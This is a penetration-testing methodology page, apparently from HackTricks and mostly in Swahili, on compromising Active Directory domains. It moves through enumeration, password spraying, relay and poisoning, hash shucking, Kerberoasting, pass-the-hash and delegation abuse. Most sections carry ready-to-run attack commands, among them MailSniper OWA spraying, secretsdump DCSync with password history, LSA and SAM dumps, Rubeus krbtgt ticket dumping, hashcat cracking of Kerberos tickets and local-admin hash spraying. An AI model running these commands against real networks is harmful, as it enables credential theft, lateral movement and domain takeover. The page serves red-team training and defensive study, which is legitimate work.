# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory** inahudumu kama teknolojia ya msingi, ikiwaletea **network administrators** uwezo wa kuunda na kusimamia kwa ufanisi **domains**, **users**, na **objects** ndani ya mtandao. Imetengenezwa ili iweze kuongezeka kwa wingi, ikiruhusu kupanga idadi kubwa ya watumiaji katika **groups** na **subgroups** zinazoweza kusimamiwa, huku ikidhibiti **access rights** katika ngazi mbalimbali.

Muundo wa **Active Directory** unajumuisha tabaka tatu kuu: **domains**, **trees**, na **forests**. **Domain** inajumuisha mkusanyiko wa objects, kama **users** au **devices**, wanaoshiriki database ya pamoja. **Trees** ni vikundi vya domains hivi vinavyounganishwa kwa muundo wa pamoja, na **forest** inawakilisha mkusanyiko wa trees nyingi, zikiwa zimeunganishwa kupitia **trust relationships**, zikifanya tabaka la juu kabisa la muundo wa shirika. Haki maalum za **access** na **communication** zinaweza kuwekwa katika kila moja ya ngazi hizi.

Madhumuni muhimu ndani ya **Active Directory** ni pamoja na:

1. **Directory** – Inaweka taarifa zote zinazohusiana na Active Directory objects.
2. **Object** – Inaashiria vitu ndani ya directory, ikijumuisha **users**, **groups**, au **shared folders**.
3. **Domain** – Hutoa chombo kwa ajili ya objects za directory, na inawezekana kwa domains nyingi kuishi ndani ya **forest**, kila moja ikiwa na mkusanyiko wake wa objects.
4. **Tree** – Kundi la domains zinazoshirikiana root domain ile ile.
5. **Forest** – Kituo cha juu cha muundo wa shirika ndani ya Active Directory, kinachojumuisha trees kadhaa zikiwa na **trust relationships** kati yao.

**Active Directory Domain Services (AD DS)** inajumuisha aina mbalimbali za huduma muhimu kwa usimamizi wa kit centrally na mawasiliano ndani ya mtandao. Huduma hizi ni pamoja na:

1. **Domain Services** – Inalenga kuhifadhi data kwa central na kusimamia mwingiliano kati ya **users** na **domains**, ikiwa ni pamoja na **authentication** na uwezo wa **search**.
2. **Certificate Services** – Inasimamia uundaji, usambazaji, na usimamizi wa **digital certificates** salama.
3. **Lightweight Directory Services** – Inaunga mkono applications zilizo na directory kupitia **LDAP protocol**.
4. **Directory Federation Services** – Inatoa uwezo wa **single-sign-on** kuthibitisha watumiaji kwa applications nyingi za wavuti katika session moja.
5. **Rights Management** – Inasaidia kulinda kazi za hakimiliki kwa kudhibiti usambazaji na matumizi yasiyoruhusiwa.
6. **DNS Service** – Muhimu kwa utolevu wa majina ya **domain names**.

Kwa ufafanuzi wa kina angalia: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Ili kujifunza jinsi ya **attack an AD** unahitaji **understand** vizuri mchakato wa **Kerberos authentication**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Unaweza kuangalia kwa haraka [https://wadcoms.github.io/](https://wadcoms.github.io) ili kupata muhtasari wa amri ambazo unaweza kutumia ku-enumerate/exploit AD.

> [!WARNING]
> Mawasiliano ya **Kerberos** yanahitaji **jina kamili la kikoa (FQDN)** ili kufanya vitendo. Ikiwa utajaribu kufikia mashine kwa kutumia anwani ya IP, **itaitumia NTLM na sio kerberos**.

## Recon Active Directory (No creds/sessions)

Ikiwa una ufikiaji wa mazingira ya AD lakini huna credentials/sessions unaweza:

- **Pentest the network:**
- Scan the network, pata machines na port zilizo wazi na jaribu **exploit vulnerabilities** au **extract credentials** kutoka kwazo (kwa mfano, [printers could be very interesting targets](ad-information-in-printers.md)).
- Enumerating DNS inaweza kutoa taarifa kuhusu servers muhimu ndani ya domain kama web, printers, shares, vpn, media, n.k.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Angalia General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) kupata taarifa zaidi kuhusu jinsi ya kufanya hili.
- **Check for null and Guest access on smb services** (hii haitafanya kazi kwenye matoleo ya kisasa ya Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Mwongozo wa kina zaidi jinsi ya ku-enumerate SMB server upo hapa:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Mwongozo wa kina zaidi jinsi ya ku-enumerate LDAP upo hapa (lipa **special attention to the anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Kusanya credentials kwa **impersonating services with Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Pata ufikiaji wa host kwa [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Kusanya credentials kwa **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Chomoa usernames/majina kutoka kwenye nyaraka za ndani, mitandao ya kijamii, services (hasa web) ndani ya mazingira ya domain na pia kutoka kwa yale yanayopatikana hadharani.
- Ikiwa utapata majina kamili ya wafanyakazi wa kampuni, unaweza kujaribu kanuni mbalimbali za AD **username conventions** ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Kanuni za kawaida zaidi ni: _NameSurname_, _Name.Surname_, _NamSur_ (herufi 3 za kila jina), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, herufi 3 za _random_ na namba 3 za _random_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Angalia kurasa za [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) na [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Wakati **invalid username is requested** server itajibu kwa kutumia **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, kuturuhusu kubaini kuwa username haikuwa sahihi. **Valid usernames** zitapokea TGT katika AS-REP au error _KRB5KDC_ERR_PREAUTH_REQUIRED_, ikionyesha kuwa mtumiaji anahitajika kufanya pre-authentication.
- **No Authentication against MS-NRPC**: Kutumia auth-level = 1 (No authentication) dhidi ya kiolesura cha MS-NRPC (Netlogon) kwenye domain controllers. Njia hii inaita kazi `DsrGetDcNameEx2` baada ya kufunga (binding) kiolesura cha MS-NRPC ili kuangalia kama user au computer ipo bila credentials yoyote. Tool ya [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) inatekeleza aina hii ya enumeration. Utafiti unaweza kupatikana [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ikiwa utapata mojawapo ya servers hizi kwenye mtandao, unaweza pia kufanya **user enumeration against it**. Kwa mfano, unaweza kutumia zana [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Hata hivyo, unapaswa kuwa na **majina ya watu wanaofanya kazi kampuni** kutoka kwa hatua ya recon ambayo unapaswa kuwa umefanya kabla. Kwa jina na jina la ukoo unaweza kutumia script [**namemash.py**](https://gist.github.com/superkojiman/11076951) kuzalisha majina ya watumiaji yanayoweza kuwa sahihi.

### Kujua jina la mtumiaji mmoja au zaidi

Sawa, hivyo unajua tayari una jina la mtumiaji halali lakini hana nywila... Basi jaribu:

- [**ASREPRoast**](asreproast.md): If a user **doesn't have** the attribute _DONT_REQ_PREAUTH_ you can **request a AS_REP message** for that user that will contain some data encrypted by a derivation of the password of the user.
- [**Password Spraying**](password-spraying.md): Tujaribu nywila za **kawaida zaidi** na kila mmoja wa watumiaji walioibuliwa, labda baadhi ya watumiaji wanatumia nywila mbaya (kumbuka sera ya nywila!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Unaweza kufanikiwa **kupata** baadhi ya changamoto **hashes** za kuvunja kwa **poisoning** baadhi ya protocols za **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Ikiwa umeweza kuorodha active directory utakuwa na **barua pepe zaidi na uelewa bora wa network**. Unaweza kuweza kulazimisha NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) ili kupata ufikiaji wa AD env.

### NetExec workspace-driven recon & relay posture checks

- Tumia **`nxcdb` workspaces** kuhifadhi state ya AD recon kwa kila engagement: `workspace create <name>` inaumba per-protocol SQLite DBs chini ya `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Badilisha views na `proto smb|mssql|winrm` na orodha ya siri zilizokusanywa kwa `creds`. Safisha data nyeti kwa mkono baada ya kumaliza: `rm -rf ~/.nxc/workspaces/<name>`.
- Ugunduo wa subnet kwa haraka kwa **`netexec smb <cidr>`** unaonyesha **domain**, **OS build**, **SMB signing requirements**, na **Null Auth**. Members wanaonyesha `(signing:False)` ni **relay-prone**, wakati DCs mara nyingi zinahitaji signing.
- Tengeneza **hostnames in /etc/hosts** moja kwa moja kutoka NetExec output ili kurahisisha kulenga:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wakati **SMB relay to the DC is blocked** kwa sababu ya signing, bado chunguza mkao wa **LDAP**: `netexec ldap <dc>` inaonyesha `(signing:None)` / weak channel binding. DC yenye SMB signing required lakini LDAP signing imezimwa bado inabaki kuwa lengo linaloweza kutumika la **relay-to-LDAP** kwa matumizi mabaya kama **SPN-less RBCD**.

### Client-side printer credential leaks → uthibitishaji kwa wingi wa credential za domain

- Printer/web UIs mara nyingine **huweka nywila za admin zilizofichwa ndani ya HTML**. Kuangalia source/devtools kunaweza kufichua cleartext (mf., `<input value="<password>">`), ikiruhusu upatikanaji wa Basic-auth kwa scan/print repositories.
- Kazi za uchapishaji zilizopokelewa zinaweza kuwa na **plaintext onboarding docs** zenye nywila za kila-mtumiaji. Hakikisha pairings zimeendana wakati wa kujaribu:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Kunyang'anya NTLM Creds

Ikiwa unaweza **kuingia kwenye PC nyingine au shares** kwa kutumia **null au guest user** unaweza **kuweka faili** (kama SCF file) ambazo ikiwa zitapigwa zinaweza ku**amsha NTLM authentication dhidi yako** ili uweze **kunyang'anya** **NTLM challenge** kuitakaifuata:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** inachukulia kila NT hash ulizonazo tayari kama candidate password kwa formats nyingine, ambazo vifaa vya kifunguzo vinatokana moja kwa moja na NT hash. Badala ya kuvunja passphrases ndefu kwenye Kerberos RC4 tickets, NetNTLM challenges, au cached credentials, unalisha NT hashes kwenye Hashcat’s NT-candidate modes na kuiruhusu ithibitishe password reuse bila kamwe kujua plaintext. Hii ni hatari hasa baada ya kuvamiwa kwa domain ambapo unaweza kuvuna maelfu ya NT hashes za sasa na za kihistoria.

Tumia shucking wakati:

- Una corpus ya NT kutoka DCSync, SAM/SECURITY dumps, au credential vaults na unahitaji kujaribu reuse katika domains/forests nyingine.
- Unashika Kerberos RC4 material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, au DCC/DCC2 blobs.
- Unataka kuthibitisha reuse kwa haraka kwa passphrases ndefu ambazo ni ngumu kuvunja na kuendelea mara moja kupitia Pass-the-Hash.

Techique hii **haifanyi kazi** dhidi ya encryption types ambazo keys hazitoki kwa NT hash (mfano, Kerberos etype 17/18 AES). Ikiwa domain inalazimisha AES-tu, lazima urudi kwa regular password modes.

#### Kuunda korasi ya NT hash

- **DCSync/NTDS** – Tumia `secretsdump.py` na history ili kupata set kubwa zaidi ya NT hashes (na thamani zao za zamani):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries hueneza dramatically candidate pool kwa sababu Microsoft inaweza kuhifadhi hadi hashes 24 za awali kwa kila akaunti. Kwa njia zaidi za kuvuna siri za NTDS angalia:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (au Mimikatz `lsadump::sam /patch`) hutoa data ya SAM/SECURITY ya ndani na cached domain logons (DCC/DCC2). Ondoa duplicate na uongeze hayo hashes kwenye orodha ile ile ya `nt_candidates.txt`.
- **Fuatilia metadata** – Hifadhi username/domain iliyozalisha kila hash (hata kama wordlist ina hex tu). Matching hashes zinakuambia mara moja ni principal gani anatumia tena password mara Hashcat itakapochapisha candidate inayoshinda.
- Tumia candidates kutoka forest ile ile au trusted forest; hilo linaongeza nafasi ya overlap wakati wa shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Vidokezo:

- NT-candidate inputs **lazima zibaki raw 32-hex NT hashes**. Zima rule engines (hakuna `-r`, hakuna hybrid modes) kwa sababu mangling huharibu candidate key material.
- Modes hizi si za kasi zaidi kwa asili, lakini keyspace ya NTLM (~30,000 MH/s on an M3 Max) ni ~100× ya haraka kuliko Kerberos RC4 (~300 MH/s). Kuangalia orodha iliyochaguliwa ya NT ni nafuu zaidi kuliko kuchunguza password space yote kwenye format polepole.
- Daima tumia **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) kwa sababu modes 31500/31600/35300/35400 zililetwa hivi karibuni.
- Kwa sasa hakuna NT mode kwa AS-REQ Pre-Auth, na AES etypes (19600/19700) zinahitaji plaintext password kwa sababu keys zao zinatengenezwa via PBKDF2 kutoka kwa UTF-16LE passwords, sio raw NT hashes.

#### Mfano – Kerberoast RC4 (mode 35300)

1. Shika RC4 TGS kwa SPN lengwa ukiwa user mwenye madaraka madogo (tazama ukurasa wa Kerberoast kwa maelezo):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck ticket ukiwa na orodha yako ya NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat hutengenezza RC4 key kutoka kwa kila NT candidate na kuthibitisha `$krb5tgs$23$...` blob. Match inathibitisha kuwa service account inatumia mojawapo ya NT hashes ulizonazo.

3. Pivoti mara moja kupitia PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Unaweza pia kurecover plaintext baadaye kwa `hashcat -m 1000 <matched_hash> wordlists/` ikiwa inahitajika.

#### Mfano – Cached credentials (mode 31600)

1. Dump cached logons kutoka workstation iliyovamiwa:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Nakili line ya DCC2 ya user inayokuvutia ndani ya `dcc2_highpriv.txt` na ui-shuck:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Match inayofanikiwa inatoa NT hash uliyokuwapo kwenye orodha yako, ikithibitisha kuwa cached user anatumia password nyingine. Tumia moja kwa moja kwa PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) au ifanye brute-force katika fast NTLM mode ili kurecover string.

Workflow hiyo ile ile inatumika kwa NetNTLM challenge-responses (`-m 27000/27100`) na DCC (`-m 31500`). Mara match itakapotambuliwa unaweza kuanzisha relay, SMB/WMI/WinRM PtH, au ku-re-crack NT hash kwa masks/rules offline.

## Kuchunguza Active Directory KWA credentials/session

Kwa hatua hii unahitaji kuwa **umefanya compromise ya credentials au session ya account halali ya domain.** Ikiwa una credentials halali au shell kama domain user, **kumbuka kwamba chaguzi zilizotajwa hapo awali bado ni njia za kuvamia watumiaji wengine.**

Kabla ya kuanza enumeration iliyothibitishwa unapaswa kujua ni nini ni **Kerberos double hop problem.**

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Uchunguzi

Kuwa umevamia akaunti ni **hatua kubwa ya kuanza kuvamia domain nzima**, kwa sababu utakuwa na uwezo wa kuanza **Active Directory Enumeration:**

Kuhusu [**ASREPRoast**](asreproast.md) sasa unaweza kupata kila mtumiaji anayeeza kuwa hatari, na kuhusu [**Password Spraying**](password-spraying.md) unaweza kupata **orodha ya majina yote ya watumiaji** na kujaribu password ya akaunti iliyovamiwa, paswedi zisizo na kitu na paswedi mpya zinazotarajia kuwa na mafanikio.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Ni rahisi sana kupata majina yote ya watumiaji wa domain kutoka Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). Katika Linux, unaweza kutumia: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` au `enum4linux -a -u "user" -p "password" <DC IP>`

> Hata kama sehemu hii ya Enumeration inaonekana ndogo, hii ndilo sehemu muhimu zaidi ya yote. Fungua viungo (hasa ile ya cmd, powershell, powerview na BloodHound), jifunze jinsi ya kuchunguza domain na piazoe mpaka ujisikie mwenye uhakika. Wakati wa assessment, hili litakuwa wakati muhimu wa kupata njia yako ya DA au kuamua kwamba hakuna kinachoweza kufanywa.

### Kerberoast

Kerberoasting inahusisha kupata **TGS tickets** zinazotumika na services zinazohusishwa na user accounts na kuvunja encryption yao—ambayo inategemea passwords za watumiaji—**offline**.

More about this in:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Mara unaopata credentials, unaweza kuangalia kama una access kwa mashine yoyote. Kwa ajili ya hilo, unaweza kutumia **CrackMapExec** kujaribu kuunganishwa kwenye servers kadhaa kwa protocols tofauti, kulingana na port scan zako.

### Local Privilege Escalation

Ikiwa umevamia credentials au session kama domain user wa kawaida na una **access** kwa user huyu kwa **mashine yoyote kwenye domain** unapaswa kujaribu kupata njia ya **escalate privileges locally na kutafuta credentials**. Hii ni kwa sababu ni kwa local administrator privileges tu utakuwa unaweza **dump hashes of other users** katika memory (LSASS) na kwa ndani (SAM).

Kuna ukurasa kamili katika kitabu hiki kuhusu [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) na [**checklist**](../checklist-windows-privilege-escalation.md). Pia, usisahau kutumia [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Ni **vigumu sana** kwamba utapata **tickets** kwa user wa sasa zinazokupatia ruhusa ya kufikia rasilimali zisizotarajiwa, lakini unaweza kuangalia:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Ikiwa umefanikiwa kuorodhesha active directory utaweza kuwa na **barua pepe zaidi na uelewa bora wa mtandao**. Unaweza uweze kulazimisha NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Tafuta Creds katika Computer Shares | SMB Shares

Sasa kwa kuwa una baadhi ya credentials za msingi unapaswa kuangalia ikiwa unaweza **kupata** faili zozote **zinavutia zinazoshirikiwa ndani ya AD**. Unaweza kufanya hivyo kwa mkono lakini ni kazi ya kuchosha ya kurudiarudia (na zaidi ikiwa utapata mamia ya docs unazohitaji kuangalia).

[**Fuata kiungo hiki kujifunza kuhusu zana unazoweza kutumia.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Uiba NTLM Creds

Ikiwa unaweza **kupata access kwa PCs nyingine au shares** unaweza **kuweka files** (kama SCF file) ambazo, zikifikiwa, zita**trigger** NTLM authentication dhidi yako ili uweze **steal** **NTLM challenge** ili kuichakua:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Udhaifu huu uliruhusu mtumiaji yeyote aliyeidhinishwa **kupata udhibiti wa domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation kwenye Active Directory WITH privileged credentials/session

**Kwa techniques zinazofuata, regular domain user haitoshi; unahitaji privileges/credentials maalum kutekeleza mashambulizi haya.**

### Hash extraction

Kwa bahati, unaweza kuwa umefanikiwa **compromise some local admin** account kwa kutumia [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) ikijumuisha relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Kisha, ni wakati wa dump hashes zote zilizopo kwenye memory na locally.\
[**Soma ukurasa huu kuhusu njia mbalimbali za kupata hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Mara utakapo kuwa na hash ya mtumiaji**, unaweza kuitumia ku**impersonate** mtumiaji huyo.\
Unahitaji kutumia zana fulani itakayofanya **NTLM authentication** ikitumia hash hiyo, **au** unaweza kuunda sessionlogon mpya na **inject** hash hiyo ndani ya **LSASS**, hivyo wakati wowote **NTLM authentication** itakapofanyika, hash hiyo itatumika. Chaguo la mwisho ndilo lifanyalo mimikatz.\
[**Soma ukurasa huu kwa habari zaidi.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Shambulio hili linalenga **kutumia NTLM hash ya mtumiaji kuomba Kerberos tickets**, kama mbadala wa kawaida wa Pass The Hash juu ya protocol ya NTLM. Kwa hivyo, inaweza kuwa hasa **faida katika mitandao ambapo NTLM protocol imezimwa** na tu **Kerberos inaruhusiwa** kama protocol ya uthibitisho.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Katika mbinu ya shambulio ya **Pass The Ticket (PTT)**, washambuliaji **huiba authentication ticket ya mtumiaji** badala ya nenosiri au thamani za hash. Ticket hii iliyoporwa inatumiwa kisha ku**impersonate** mtumiaji, kupata access isiyoidhinishwa kwa rasilimali na huduma ndani ya mtandao.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Ikiwa una **hash** au **password** ya **local administrator**, jaribu **ku-login locally** kwenye PCs nyingine ukitumia hizo.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Kumbuka kwamba hii ni **enye kelele nyingi** na **LAPS** itapunguza hili.

### MSSQL Abuse & Trusted Links

Ikiwa mtumiaji ana ruhusa za **kuingia kwenye instances za MSSQL**, anaweza kutumia hiyo ili **kutekeleza amri** kwenye mwenyeji wa MSSQL (ikiwa inakimbia kama SA), **kuiba** NetNTLM **hash** au hata kufanya **relay attack**.\
Pia, ikiwa instance ya MSSQL inatambulika kama trusted (database link) na instance tofauti ya MSSQL. Ikiwa mtumiaji ana ruhusa juu ya database inayotumika kama trusted, atakuwa na uwezo wa **kutumia uhusiano wa kuaminiana ili kutekeleza queries pia kwenye instance nyingine**. Uaminifu huu unaweza kuunganishwa mnyororo na kwa wakati fulani mtumiaji anaweza kupata database iliyopangwa vibaya ambapo anaweza kutekeleza amri.\
**Viungo kati ya databases vinafanya kazi hata kupitia forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Matumizi mabaya ya majukwaa ya IT ya mali/utoaji

Suits za wahusika wa tatu za inventory na deployment mara nyingi zinaweka njia zenye nguvu za kupata credentials na utekelezaji wa msimbo. Angalia:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ikiwa utapata chochote cha Computer object chenye attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) na una ruhusa za domain kwenye kompyuta hiyo, utaweza kuchoma TGTs kutoka kwenye memory ya watumiaji wote wanaoingia kwenye kompyuta.\
Kwa hiyo, ikiwa **Domain Admin anaingia kwenye kompyuta**, utaweza kuchoma TGT yake na kumfanyia impersonate kutumia [Pass the Ticket](pass-the-ticket.md).\
Shukrani kwa constrained delegation unaweza hata **kuharibu moja kwa moja Print Server** (itumie matumaini itakuwa DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ikiwa mtumiaji au kompyuta imekubaliwa kwa "Constrained Delegation" itakuwa na uwezo wa **kujiganganya kama mtumiaji yeyote ili kufikia baadhi ya huduma kwenye kompyuta**.\
Kisha, ikiwa uta **komprometi hash** ya mtumiaji/kompyuta hii utaweza **kujiganganya kama mtumiaji yeyote** (hata domain admins) kupata baadhi ya huduma.

{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Kuwa na ruhusa ya **WRITE** juu ya Active Directory object ya kompyuta ya mbali kunaruhusu kupata utekelezaji wa msimbo kwa **ruhusa zilizoinuliwa**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Mtumiaji aliyekompromiwa anaweza kuwa na baadhi ya **ruhusa za kuvutia juu ya baadhi ya objects za domain** ambazo zinaweza kukuruhusu **kusogea upande/kuinua** ruhusa baadaye.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

